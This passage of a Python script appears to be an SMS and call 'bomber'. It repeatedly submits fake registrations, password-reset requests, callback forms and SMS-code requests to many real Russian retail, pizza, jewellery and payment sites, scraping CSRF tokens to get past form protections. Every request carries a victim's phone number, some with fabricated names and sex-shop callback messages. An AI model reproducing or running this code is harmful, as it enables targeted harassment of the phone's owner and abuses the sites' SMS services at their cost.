						'x-requested-with': 'XMLHttpRequest'
					},
				data = {
					"data[firstname]": "sfdsdf",
					"data[lastname]": "sdfsdf",
					"data[email]": "fsdhgsdh@gmail.com",
					"data[phone]": phone3,
					"data[terms_accepted]": "1",
					"wa_json_mode": "1",
					"need_redirects": "1",
					"contact_type": "person"
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("bestsex " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.post("https://www.sima-land.ru/api/v3/signup-form/",
				headers = {
						'accept': 'application/json, text/plain, */*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/json;charset=UTF-8',
						'origin': 'https://www.sima-land.ru',
						'referer': 'https://www.sima-land.ru/cabinet/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'simaland-service-frontend': '{"serviceName":"authorization-modal","isMobile":false}',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				json = {
					"name":"sgsdgsdg",
					"email":"ashgsadfsdf@gmail.com",
					"settlement_id":27503892,
					"password":"123123123",
					"phone":phone3,
					"isAcceptAgreement":"true",
					"isWholesaleBuyer":0,
					"isSubscribedForNewsletter":"true"
				}
			)
			response = session.post("https://www.sima-land.ru/api/v3/password-reset-request-form/",
				headers = {
						'accept': 'application/json, text/plain, */*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/json;charset=UTF-8',
						'origin': 'https://www.sima-land.ru',
						'referer': 'https://www.sima-land.ru/cabinet/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'simaland-service-frontend': '{"serviceName":"authorization-modal","isMobile":false}',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				json = {
					"entity":phone
				}
			)
			print(response.text)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("sima-land " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			response = requests.post("https://orenburg.playsexshop.ru/", 
				headers = {
					'accept': '*/*',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'origin': 'https://orenburg.playsexshop.ru',
					'referer': 'https://orenburg.playsexshop.ru/seks-igrushki/falloimitatori/',
					'sec-fetch-mode': 'cors',
					'sec-fetch-site': 'same-origin',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
					'x-requested-with': 'XMLHttpRequest'
					},
				data = {
					"data[name]" : (None, "Настя"),
					"data[tel]" : (None, phone4),
					"data[text]" : (None, "Не могу заказать"),
					"agreement" : (None, "on"),
					"comp" : (None, "form2"),
					"from" : (None, "callme"),
					"send" : (None, "1")
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("playsexshop " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			response = requests.post("https://sexmagaz24.ru/signup/",
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
						'origin': 'https://sexmagaz24.ru',
						'referer': 'https://sexmagaz24.ru/signup/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-requested-with': 'XMLHttpRequest'
					},
				data = {
					"data[firstname]": "sfdsdf",
					"data[email]": "dsgsdgsdg@gmail.com",
					"data[phone]": phone3,
					"data[password]": "123123123",
					"data[password_confirm]": "123123123",
					"wa_json_mode": "1",
					"need_redirects": "1",
					"contact_type":"person"
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("sexmagaz24 " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.post("https://shpi-vi.ru/ajax/profile/register.php", 
				headers = {
					'accept': '*/*',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'origin': 'https://shpi-vi.ru',
					'referer': 'https://shpi-vi.ru/personal/orders/',
					'sec-fetch-mode': 'cors',
					'sec-fetch-site': 'same-origin',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
					'x-requested-with': 'XMLHttpRequest'
					},
				data ={
					"NAME" : (None, "sdfsdf"),
					"PHONE" : (None, phone),
					"EMAIL" : (None, "asgsdgs@gmail.com"),
					"PASSWORD" : (None, "123123123"),
					"AJAX_CALL" : (None, "Y")
				}
			)
			response = session.post("https://shpi-vi.ru/ajax/profile/get_sms_code.php",
				headers = {
					'accept': '*/*',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'origin': 'https://shpi-vi.ru',
					'referer': 'https://shpi-vi.ru/personal/',
					'sec-fetch-mode': 'cors',
					'sec-fetch-site': 'same-origin',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
					'x-requested-with': 'XMLHttpRequest'
					},
				data = {
					"PHONE" : (None, phone),
					"AJAX_CALL" : (None, "Y")
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("sexmagaz24 " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()

			response = session.get("https://sokolov.ru/jewelry-catalog/product/029468/?etext=2202.o8Mw81pLj3DYmDjeoIGKIGZ2b2JpeGpjeHh4bmh2cHM.f6a3dd445e640af03013156dd94de049104805cf&yclid=5656278673516975249&utm_medium=cpc&utm_source=yandex&utm_campaign=cid%3A75739227|cn%3Amgcom_shopping_p_other&utm_term=tid%3A2608449|tn%3Afilter&utm_content=re%3A2608449|gr%3A4952823007|b%3A12789612349|drf%3Ano|st%3Asearch|s%3Anone|p%3A1|pt%3Apremium|dt%3Adesktop|cgc%3A0",
				headers = {
						'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Cache-Control': 'no-cache',
						'Connection': 'keep-alive',
						'Host': 'sokolov.ru',
						'Pragma': 'no-cache',
						'Referer': 'https://yandex.ru/',
						'Sec-Fetch-Mode': 'navigate',
						'Sec-Fetch-Site': 'cross-site',
						'Sec-Fetch-User': '?1',
						'Upgrade-Insecure-Requests': '1',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)

			response = session.post("https://sokolov.ru/api/v4/profile/user/send-code/",
				headers = {
						'Accept': '*/*',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Cache-Control': 'no-cache',
						'Connection': 'keep-alive',
						'Content-Type': 'application/vnd.api+json',
						'Host': 'sokolov.ru',
						'Origin': 'https://sokolov.ru',
						'Pragma': 'no-cache',
						'Referer': 'https://sokolov.ru/jewelry-catalog/product/029468/?etext=2202.o8Mw81pLj3DYmDjeoIGKIGZ2b2JpeGpjeHh4bmh2cHM.f6a3dd445e640af03013156dd94de049104805cf&yclid=5656278673516975249&utm_medium=cpc&utm_source=yandex&utm_campaign=cid%3A75739227|cn%3Amgcom_shopping_p_other&utm_term=tid%3A2608449|tn%3Afilter&utm_content=re%3A2608449|gr%3A4952823007|b%3A12789612349|drf%3Ano|st%3Asearch|s%3Anone|p%3A1|pt%3Apremium|dt%3Adesktop|cgc%3A0',
						'Sec-Fetch-Mode': 'cors',
						'Sec-Fetch-Site': 'same-origin',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'X-Source': 'site'
					},
				json = {"data":{"type":"login","attributes":{"phone":phone}}}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("sokolov " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()

			response = session.get("https://xn--90aamkcop0a.xn--p1ai/",
				headers = {
						'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Cache-Control': 'no-cache',
						'Connection': 'keep-alive',
						'Host': 'xn--90aamkcop0a.xn--p1ai',
						'Pragma': 'no-cache',
						'Referer': 'https://yandex.ru/',
						'Sec-Fetch-Mode': 'navigate',
						'Sec-Fetch-Site': 'cross-site',
						'Sec-Fetch-User': '?1',
						'Upgrade-Insecure-Requests': '1',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)

			response = session.post("https://xn--90aamkcop0a.xn--p1ai/api/v5/user/start-authorization",
				headers = {
						'Accept': '*/*',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Cache-Control': 'no-cache',
						'Connection': 'keep-alive',
						'Content-Type': 'application/json',
						'Host': 'xn--90aamkcop0a.xn--p1ai',
						'Origin': 'https://xn--90aamkcop0a.xn--p1ai',
						'Pragma': 'no-cache',
						'Referer': 'https://xn--90aamkcop0a.xn--p1ai/',
						'Sec-Fetch-Mode': 'cors',
						'Sec-Fetch-Site': 'same-origin',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'X-Requested-With': 'XMLHttpRequest'
					},
				json = {
					"phone": phone6
					}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("blinberry " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()

			response = session.get("https://s-kitchen.ru/",
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'pragma': 'no-cache',
						'referer': 'https://yandex.ru/',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'cross-site',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)

			response = session.post("https://s-kitchen.ru/wp-admin/admin-ajax.php",
				headers = {
						'accept': 'application/json, text/javascript, */*; q=0.01',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryGuAABsVY3lexDGh1',
						'origin': 'https://s-kitchen.ru',
						'pragma': 'no-cache',
						'referer': 'https://s-kitchen.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-requested-with': 'XMLHttpRequest'
					},
				data = {
					"post_id" : (None, "406"),
					"form_id" : (None, "5b632a75"),
					"referer_title" : (None, "Главная — Компания «СК» — это профессиональные услуги в области производства кухонь и гостиных в соответствии с европейскими стандартами"),
					"queried_id" : (None, "13"),
					"form_fields[name]" : (None, "Ифывфвфы"),
					"form_fields[email]" : (None, phone),
					"action" : (None, "elementor_pro_forms_send_form"),
					"referrer" : (None, "https://s-kitchen.ru/")
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("s_kitchen " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()

			response = session.get("https://www.chitai-gorod.ru/",
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'pragma': 'no-cache',
						'referer': 'https://yandex.ru/',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'cross-site',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)


			response = session.get("https://webapi.chitai-gorod.ru/web/verify/phone/send?token=123&action=create&data%5Bphone%5D="+phone+"&data%5Btype%5D=1",
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'content-type': 'application/x-www-form-urlencoded',
						'origin': 'https://www.chitai-gorod.ru',
						'pragma': 'no-cache',
						'referer': 'https://www.chitai-gorod.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-site',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("chitai_gorod " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()

			response = session.get("https://www.askona.ru/",
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'pragma': 'no-cache',
						'referer': 'https://yandex.ru/',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'cross-site',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
					}
			)
			csrf = re.search('name="sessid" id="sessid" value="(.+?)"', response.text).group(1)

			response = session.get("https://www.askona.ru/api/v1/user/auth?phone="+phone2+"&captchaToken=&csrf_token="+csrf,
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'pragma': 'no-cache',
						'referer': 'https://www.askona.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-bitrix-csrf-token': 'true',
						'x-csrf-token': 'true'
					}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("askona " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()

			response = session.get("https://www.is74.ru/newsite/home/connect/",
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'pragma': 'no-cache',
						'referer': 'https://www.is74.ru/',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'same-origin',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)

			response = session.post("https://www.is74.ru/oldsite/home/connect/formy_connect/landing/lib/common/order_req.php",
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'authorization': 'Bearer https://www.is74.ru',
						'cache-control': 'no-cache',
						'origin': 'https://www.is74.ru',
						'pragma': 'no-cache',
						'referer': 'https://www.is74.ru/newsite/home/connect/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				data = {
						"utm_source" : (None, ""),
						"utm_medium" : (None, ""),
						"utm_campaign" : (None, ""),
						"utm_content" : (None, ""),
						"utm_term" : (None, ""),
						"pageId" : (None, "is74_home_connect"),
						"source" : (None, "site"),
						"comment" : (None, "Заявка с сайта is74, страница самопланирования"),
						"phone" : (None, phone2)
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("is74 " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()

			response = session.get("https://www.shoppinglive.ru/?utm_source=yandex&utm_medium=cpc&utm_campaign=al_on_yandex_search_brand_new_russia_65586227&utm_term=shopping%20live&utm_content=ad_id%7C11976594780%7Cbanner_id%7C11976594780%7Ccampaign_type%7Ctype1%7Ccampaign_id%7C65586227%7Cdevice_type%7Cdesktop%7Cgroup_id%7C4778114811%7Cphrase_id%7C36534785499%7Cposition%7C1%7Cposition_type%7Cpremium%7Cplacement%7Cnone%7Cplacement_type%7Csearch%7Cregion_name%7C%D0%9E%D1%80%D0%B5%D0%BD%D0%B1%D1%83%D1%80%D0%B3&etext=2202.36cN_rLsgH5OAQc5PQG7zfs6ekfSNqIUePfD2E8oqRxsa2Vsd25vbGlxaGtib2Vx.18a980d2b426912dd8fd21c9847e159c808eeb59&yclid=5543336755170445501",
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'pragma': 'no-cache',
						'referer': 'https://yandex.ru/',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'cross-site',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)
			csrf = re.search("ACC.config.CSRFToken = '(.+?)'", response.text).group(1)
			
			response = session.post("https://www.shoppinglive.ru/phone-verification/send-code",
				headers = {
						'accept': 'application/json, text/plain, */*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'content-type': 'application/x-www-form-urlencoded',
						'origin': 'https://www.shoppinglive.ru',
						'pragma': 'no-cache',
						'referer': 'https://www.shoppinglive.ru/?utm_source=yandex&utm_medium=cpc&utm_campaign=al_on_yandex_search_brand_new_russia_65586227&utm_term=shopping%20live&utm_content=ad_id%7C11976594780%7Cbanner_id%7C11976594780%7Ccampaign_type%7Ctype1%7Ccampaign_id%7C65586227%7Cdevice_type%7Cdesktop%7Cgroup_id%7C4778114811%7Cphrase_id%7C36534785499%7Cposition%7C1%7Cposition_type%7Cpremium%7Cplacement%7Cnone%7Cplacement_type%7Csearch%7Cregion_name%7C%D0%9E%D1%80%D0%B5%D0%BD%D0%B1%D1%83%D1%80%D0%B3&etext=2202.36cN_rLsgH5OAQc5PQG7zfs6ekfSNqIUePfD2E8oqRxsa2Vsd25vbGlxaGtib2Vx.18a980d2b426912dd8fd21c9847e159c808eeb59&yclid=5543336755170445501',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				data = {
					'mobilePhone': phone1,
					'CSRFToken': csrf
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("is74 " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()

			session.get("https://tashirpizza.ru/account",
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'pragma': 'no-cache',
						'referer': 'https://tashirpizza.ru/samara',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'same-origin',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)

			response = session.post("https://tashirpizza.ru/ajax/mindbox_register",
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
						'origin': 'https://tashirpizza.ru',
						'pragma': 'no-cache',
						'referer': 'https://tashirpizza.ru/account',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-requested-with': 'XMLHttpRequest'
					},
				data = {
					'phone': phone2,
					'fio': 'Захаров Алексей Дмитриевич',
					'bd': ''
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("tashirpizza " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			
			response = session.get("https://www.yamaguchi.ru/",
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'pragma': 'no-cache',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'none',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)

			csrf = re.search(' name="_csrf" value="(.+?)"', response.text).group(1)

			response = session.post("https://www.yamaguchi.ru/user/site/registration",
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'content-type': 'application/x-www-form-urlencoded',
						'origin': 'https://www.yamaguchi.ru',
						'pragma': 'no-cache',
						'referer': 'https://www.yamaguchi.ru/user/site/registration',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'same-origin',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				data = {
					'_csrf': csrf,
					'User[fname]': 'asdsad',
					'User[lname]': 'asdasd',
					'User[email]': 'asgsagags@gmail.com',
					'User[internationalCode]': '',
					'User[phoneForeign]': '',
					'User[phone]': phone2,
					'User[birthdate]': '14-02-2000',
					'User[city]': 'Москва',
					'User[gender]': 'm',
					'User[password]': '123123123',
					'User[password_repeat]': '123123123',
					'User[consent_to_subscription]': '1',
					'LoginFormThrowSms[tokenForGoogleCaptcha] ': '',
					'User[smsForRegistration]': '',
					'User[smsForRegistrationWithSession]': '',
					'User[smsSend]': '',
					'User[smsForRegistrationRepeat]': ''
				}
			)

			x_csrf = re.search('name="csrf-token" content="(.+?)"', response.text).group(1)

			response = session.post("https://www.yamaguchi.ru/user/ajax/flash-call",
				headers = {
						'accept': 'application/json, text/javascript, */*; q=0.01',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'no-cache',
						'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
						'origin': 'https://www.yamaguchi.ru',
						'pragma': 'no-cache',
						'referer': 'https://www.yamaguchi.ru/user/site/registration',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-csrf-token': x_csrf,
						'x-requested-with': 'XMLHttpRequest'
					},
				data = {
					'userPhone': phone2
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("yamaguchi " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()

			response = session.get("https://salampay.com/",
				headers = {
						'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Cache-Control': 'max-age=0',
						'Connection': 'keep-alive',
						'Host': 'salampay.com',
						'Referer': 'https://yandex.ru/',
						'Sec-Fetch-Mode': 'navigate',
						'Sec-Fetch-Site': 'cross-site',
						'Sec-Fetch-User': '?1',
						'Upgrade-Insecure-Requests': '1',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)
			submitkey = re.search("name='_submitKey' value='(.+?)'", response.text).group(1)
			token = re.search("name='TOKEN(.+?)' value='(.+?)'", response.text)
			name_token = token.group(1)
			value_token = token.group(2)
			
			response = session.post("https://salampay.com/",
				headers = {
						'Accept': '*/*',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Connection': 'keep-alive',
						'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
						'Host': 'salampay.com',
						'Origin': 'https://salampay.com',
						'Referer': 'https://salampay.com/',
						'Sec-Fetch-Mode': 'cors',
						'Sec-Fetch-Site': 'same-origin',
